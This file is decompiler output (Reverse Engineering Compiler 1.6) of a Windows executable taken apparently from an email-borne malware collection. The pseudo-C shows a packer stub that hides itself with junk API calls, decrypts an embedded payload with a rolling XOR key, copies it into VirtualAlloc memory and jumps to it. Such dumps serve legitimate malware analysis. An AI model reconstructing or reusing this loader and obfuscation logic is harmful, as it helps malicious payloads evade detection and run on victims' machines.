/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0704/ia32_pe/subject.exe'
 */

/*	Procedure: 0x1310D000 - 0x1310D0B1
 *	Argument size: -12
 *	Local size: 36
 *	Save regs size: 0
 */

L1310D000(A8, Ac, A10, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe7;
	/* unknown */ void  Vffffffe8;



    eax = *(ebp + 20);
    *eax = A10;
    eax = A18;
    Vffffffe4 = 0;
    Vffffffe4 = Vffffffe4 + 5;
    Vffffffe4 = Vffffffe4 / Vffffffe4;
    Vffffffe8 = Vffffffe4 % Vffffffe4;
    for(Ac = Ac + A18; 1; Ac = ecx) {
        esi = A10;
        A10 = A10 - 1;
        if(esi == 0) {
            break;
        }
        *__imp__AddAtomW( & A10);
        Vffffffe7 = *Ac;
        (save)(Vffffffe8 & 65535) + A1c;
        ebx = 0;
        eax = 0;
        Vffffffe7 = Vffffffe7 ^ *((Vffffffe8 & 65535) + A1c) & 255;
        *A8 = Vffffffe7;
        Vffffffe8 = (Vffffffe8 & 65535) + 1;
        if(Vffffffe8 == 5) {
            esi = 0;
            Vffffffe8 = 0;
        }
        eax = A8 + 1;
        if(eax == -1207959552) {
            break;
        }
        A8 = eax;
        ecx = Ac + 1;
    }
}

/*	Procedure: 0x1310D0B2 - 0x1310D5C1
 *	Argument size: -702
 *	Local size: 724
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffffd3c;
	/* unknown */ void  Vfffffd40;
	/* unknown */ void  Vfffffd94;
	/* unknown */ void  Vfffffd9c;
	/* unknown */ void  Vfffffda0;
	/* unknown */ void  Vfffffda4;
	/* unknown */ void  Vfffffdac;
	/* unknown */ void  Vfffffdb0;
	/* unknown */ void  Vfffffdb8;
	/* unknown */ void  Vfffffdbc;
	/* unknown */ void  Vfffffdc0;
	/* unknown */ void  Vfffffdc4;
	/* unknown */ void  Vfffffdc8;
	/* unknown */ void  Vfffffdcc;
	/* unknown */ void  Vfffffdd0;
	/* unknown */ void  Vfffffdd1;
	/* unknown */ void  Vfffffdfc;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save)616;
    (save)178257920;
    (save)0;
    *__imp__FindResourceW();
    (save)252267142;
    (save)12386304;
    (save)524288;
    (save)259072;
    *L1310e278();
    (save)876544;
    *L1310e298( & Vfffffdfc);
    edx = ecx + -1;
    Vfffffd40 = edx;
    Vfffffdc4 = Vfffffd40;
    eax = esi;
    (save)146432;
    (save)1073741824;
    (save)4587520;
    (save)2310144;
    *__imp__FindResourceExA();
    (save)252267139;
    (save) & Vfffffdfc;
    (save)471040;
    *L1310e280();
    *__imp__GetCurrentProcessId();
    Vfffffdd0 = 158;
    Vfffffdd1 = -1291242224;
    (save)131072;
    (save)39845888;
    (save)3866624;
    (save)3152;
    (save)12032;
    (save)0;
    (save)1360;
    *L1310e290();
    Vfffffdc4 = Vfffffdc4 ^ 471444821;
    (save)603979776;
    (save)149946368;
    (save)14286848;
    *__imp__FindResourceW();
    Vfffffdc8 = *Vfffffdc4;
    (save)18350080;
    (save)22544384;
    *L1310e288();
    (save) & Vfffffdd0;
    (save)0;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdc8;
    (save) & Vfffffdc8;
    L1310D000();
    Vffffffdc = ebp;
    Vffffffdc = Vffffffdc + 4;
    Vfffffdac = *(Vfffffdc4 + 4);
    (save)7274496;
    (save)54788096;
    (save)254803968;
    (save)32112640;
    *__imp__FindResourceExW();
    (save) & Vfffffdd0;
    (save)4;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdac - 4;
    (save) & Vfffffdac;
    L1310D000();
    Vfffffff0 = *(Vfffffdc4 + 8);
    (save) & Vfffffdd0;
    (save)8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffff0 - 8;
    (save) & Vfffffff0;
    L1310D000();
    (save)28416;
    *__imp__FreeLibrary();
    Vffffffe0 = Vfffffdc4 + 12;
    Vffffffe4 = 319815680;
    Vfffffdb0 = Vffffffe4 + 4096;
    Vfffffdb8 = 12;
    Vffffffe8 = *Vffffffe0;
    (save) & Vfffffdd0;
    (save)Vfffffdb8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vffffffe8 - Vfffffdb8;
    (save) & Vffffffe8;
    L1310D000();
    Vffffffe8 = Vffffffe8 + *__imp__GetLastError() - 123;
    Vffffffe8 = Vffffffe8 + Vffffffe4;
    (save)973078528;
    (save)163840;
    (save)0;
    *__imp__FindResourceW();
    Vfffffdb8 = Vfffffdb8 + 4;
    Vffffffe0 = Vffffffe0 + 4;
    Vfffffdbc = *Vffffffe0;
    (save) & Vfffffdd0;
    (save)Vfffffdb8;
    (save) & Vfffffff4;
    (save)4;
    (save) & Vfffffdbc - Vfffffdb8;
    (save) & Vfffffdbc;
    L1310D000();
    Vfffffdb8 = Vfffffdb8 + 4;
    (save)31488;
    (save)480;
    (save)384;
    *__imp__FindResourceW();
    Vffffffe0 = Vffffffe0 + 4;
    Vffffffd8 = Vfffffff0 * 8 + 12;
    (save)64;
    (save)12288;
    Vfffffd3c = Vffffffd8;
    Vfffffd3c = Vfffffd3c + Vfffffdac;
    Vfffffd3c = Vfffffd3c + Vfffffdc8;
    (save)Vfffffd3c;
    (save)Vfffffd40 - 252267141;
    Vfffffda4 = *__imp__VirtualAlloc();
    Vfffffff8 = Vffffffe8 + Vffffffd8;
    Vfffffdc0 = Vffffffd8;
    Vfffffda0 = Vfffffdc0;
    Vfffffffc = 0;
    for(Vffffffec = 0; 1 != 0; Vfffffdc0 = Vfffffdc0 + 1) {
        if(Vfffffda0 == Vfffffdbc) {
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == Vfffffff0) {
                break;
            }
            Vffffffe8 = *Vffffffe0;
            (save) & Vfffffdd0;
            (save)Vfffffdb8;
            (save) & Vfffffff4;
            (save)4;
            (save) & Vffffffe8 - Vfffffdb8;
            (save) & Vffffffe8;
            L1310D000();
            Vffffffe8 = Vffffffe8 + Vffffffe4;
            Vfffffdb8 = Vfffffdb8 + 4;
            Vffffffe0 = Vffffffe0 + 4;
            Vfffffdbc = *Vffffffe0;
            (save) & Vfffffdd0;
            (save)Vfffffdb8;
            (save) & Vfffffff4;
            (save)4;
            (save) & Vfffffdbc - Vfffffdb8;
            (save) & Vfffffdbc;
            L1310D000();
            Vfffffdb8 = Vfffffdb8 + 4;
            Vffffffe0 = Vffffffe0 + 4;
            Vfffffda0 = 0;
            Vfffffff8 = Vffffffe8;
        }
        *(Vfffffda4 + Vffffffec) = *Vfffffff8;
        Vfffffff8 = Vfffffff8 + 1;
        Vffffffec = Vffffffec + 1;
        Vfffffda0 = Vfffffda0 + 1;
    }
    (save) & Vfffffdd0;
    (save)Vffffffd8;
    (save) & Vfffffdcc;
    (save)Vfffffdac;
    (save)Vfffffda4 - Vffffffd8;
    (save)Vfffffda4;
    L1310D000();
    Vfffffd94 = Vfffffda4 + 3920;
    Vfffffd9c = Vfffffd94;
    (save)Vffffffdc;
    (save) & Vfffffdd0;
    ebx = Vfffffdac;
    (save)ebx;
    (save)Vfffffdc8;
    (save)Vfffffda4;
    (save)Vfffffda4 + Vfffffdac;
    Vfffffd9c();
    ecx = ecx ^ ebx;
    return(*__imp__ExitProcess(0));
}

stack space not deallocated on return
/*	Procedure: 0x1310D5C2 - 0x1310D6A7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D5C2()
{



    (save)ebp;
    ebp = esp;
    (save)eax | 557056;
    (save)106496;
    (save)436;
    eax = *%fs:0x0];
    (save)eax;
    *%fs:0x0] = esp;
    esp = esp - 3840;
    (save)25600;
    (save)ebx;
    (save)ecx;
    *(ebp - 40) = esp;
    *(ebp - 8) = ebx;
    ebx = 3473408 ^ eax;
    eax = *eax;
    *(ebp - 72) = eax;
    if(*(ebp - 76) == ecx) {
        (save)2293760;
        *(ebp - 32) = 6464;
    }
    edi = edi ^ eax;
    (save)21632;
    edi = *(ebp - 36);
    *(ebp - 72) = edi;
    (save) *(ebp - 72) + 2424832;
    (save) *(ebp - 60);
    edi = ebp - 100;
    (save)eax;
    edi = ebp - 112;
    (save)eax;
    (save)ebp - 96;
    edi = ebp - 124;
    (save)edi;
    (save)edi;
    eax = *(L1310D6AF());
    *(ebp - 116) = eax;
    if(!(esp = esp + 36)) {
        do {
            *(ebp - 112) = ecx;
        } while(!(ecx = ecx + 1) && esi != 1867776);
        != ? 0x1310d65f : ;
L1310d65b:
        ecx = ecx + 1;
        *(ebp - 116) = esi;
L1310d65f:
        al = *ecx;
        eax :: esi;
        if(edi <= 25600) {
            goto L1310d65b;
        }
        *(ebp - 52) = eax;
        ebx = *(ebp - 112) + -805306368;
    } else {
        while(1) {
            if(*esi <= 20) {
                goto L1310d65f;
            }
            eax = eax + 1;
            *(ebp - 116) = eax;
        }
    }
    eax = 98566144;
    (save)edi;
    (save)ebx;
    (save)edi;
    (save)110592;
    *(ebp - 104) = edi;
    eax = ebp + -704;
    (save)eax;
    (save)ebx;
    *(ebp - 120) = *( *( *(ebp - 20)));
}

/*	Procedure: 0x1310D6A8 - 0x1310D6AE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D6A8()
{



    esp = *(ebp - 24);
    (save) *(ebp - 120);
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x1310D6AF - 0x1310D6B8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D6AF()
{



    ecx = 212992;
    (restore)edi;
    return(0);
}

/*	Procedure: 0x1310D6B9 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L1310D6B9()
{



}

/* address  size  */
/* 0x1310d0b2       0 */ /* unknown */ void 	__entry_point__;
/* 0x1310e1a4       0 */ /* unknown */ void 	__imp___chdir;
/* 0x1310e1a8       0 */ /* unknown */ void 	__imp___c_exit;
/* 0x1310e1ac       0 */ /* unknown */ void 	__imp___access;
/* 0x1310e1b0       0 */ /* unknown */ void 	__imp___cabs;
/* 0x1310e1b4       0 */ /* unknown */ void 	__imp___assert;
/* 0x1310e1b8       0 */ /* unknown */ void 	__imp___atoldbl;
/* 0x1310e1bc       0 */ /* unknown */ void 	__imp___atoi64;
/* 0x1310e1c0       0 */ /* unknown */ void 	__imp___beep;
/* 0x1310e1c8       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x1310e1cc       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x1310e1d0       0 */ /* unknown */ void 	__imp__MultiByteToWideChar;
/* 0x1310e1d4       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x1310e1d8       0 */ /* unknown */ void 	__imp__FreeLibrary;
/* 0x1310e1dc       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x1310e1e0       0 */ /* unknown */ void 	__imp__FindResourceExW;
/* 0x1310e1e4       0 */ /* unknown */ void 	__imp__UnhandledExceptionFilter;
/* 0x1310e1e8       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x1310e1ec       0 */ /* unknown */ void 	__imp__WideCharToMultiByte;
/* 0x1310e1f0       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x1310e1f4       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x1310e1f8       0 */ /* unknown */ void 	__imp__AddAtomW;
/* 0x1310e1fc       0 */ /* unknown */ void 	__imp__SetUnhandledExceptionFilter;
/* 0x1310e200       0 */ /* unknown */ void 	__imp__DeleteCriticalSection;
/* 0x1310e204       0 */ /* unknown */ void 	__imp__FindResourceW;
/* 0x1310e208       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x1310e20c       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x1310e210       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x1310e214       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x1310e218       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x1310e21c       0 */ /* unknown */ void 	__imp__GetCurrentThreadId;
/* 0x1310e220       0 */ /* unknown */ void 	__imp__GetSystemTimeAsFileTime;
/* 0x1310e224       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x1310e228       0 */ /* unknown */ void 	__imp__FindResourceExA;
/* 0x1310e22c       0 */ /* unknown */ void 	__imp__QueryPerformanceCounter;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
